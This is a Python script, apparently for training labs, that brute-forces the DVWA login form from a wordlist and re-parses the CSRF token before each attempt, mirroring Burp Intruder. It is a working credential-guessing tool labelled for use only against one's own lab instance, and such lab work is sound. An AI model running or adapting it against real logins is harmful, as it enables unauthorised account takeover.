#!/usr/bin/env python3
"""
Basic login brute-forcer mirroring Burp Intruder "sniper" on the password field.

DVWA issues a per-request CSRF token (`user_token`) on the login form; this script
parses it from GET /login.php before each attempt (same flow you configure in Burp
with a grep rule + recursive grep).

Lab only — run only against your own DVWA instance.

Example:
  python brute_force.py --base-url http://localhost:4280 --user admin --wordlist wordlist.txt
"""

from __future__ import annotations

import argparse
import re
import sys
import time
from pathlib import Path

import requests

TOKEN_RE = re.compile(r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)['\"]")


def fetch_token(session: requests.Session, login_url: str) -> str | None:
    r = session.get(login_url, timeout=15)
    m = TOKEN_RE.search(r.text)
    return m.group(1) if m else None


def try_login(session: requests.Session, login_url: str, user: str, password: str, token: str) -> requests.Response:
    data = {
        "username": user,
        "password": password,
        "Login": "Login",
        "user_token": token,
    }
    return session.post(login_url, data=data, timeout=15, allow_redirects=True)


def load_wordlist(path: Path) -> list[str]:
    lines = path.read_text(encoding="utf-8").splitlines()
    return [ln.strip() for ln in lines if ln.strip() and not ln.startswith("#")]


def main() -> int:
    parser = argparse.ArgumentParser(description="DVWA login brute force (lab).")
    parser.add_argument("--base-url", default="http://localhost:4280", help="DVWA root, no trailing slash.")
    parser.add_argument("--user", default="admin", help="Username to test.")
    parser.add_argument("--wordlist", type=Path, default=Path(__file__).with_name("wordlist.txt"))
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between attempts (seconds).")
    args = parser.parse_args()

    login_url = f"{args.base_url.rstrip('/')}/login.php"
    session = requests.Session()
    session.headers.update({"User-Agent": "dvwa-bruteforce-lab/0.1"})

    try:
        words = load_wordlist(args.wordlist)
    except OSError as e:
        print(f"[!] Cannot read wordlist: {e}", file=sys.stderr)
        return 2

    print(f"[*] Target: {login_url} user={args.user!r} attempts={len(words)}")

    for i, pwd in enumerate(words, start=1):
        token = fetch_token(session, login_url)
        if not token:
            print("[!] Could not parse user_token; check URL and DVWA availability.", file=sys.stderr)
            return 2

        r = try_login(session, login_url, args.user, pwd, token)
        # Successful login typically redirects away from login.php and sets session.
        if r.url.rstrip("/").endswith("index.php") or "login.php" not in r.url:
            print(f"[+] Candidate success on attempt {i}: password={pwd!r}")
            print(f"    Final URL: {r.url}")
            return 0

        if "Login failed" not in r.text and "login.php" not in r.url.lower():
            print(f"[?] Ambiguous response {i} ({pwd!r}) — verify manually. URL={r.url}")
        time.sleep(args.delay)

    print("[*] No success with given wordlist (expected if passwords not in list or protections enabled).")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
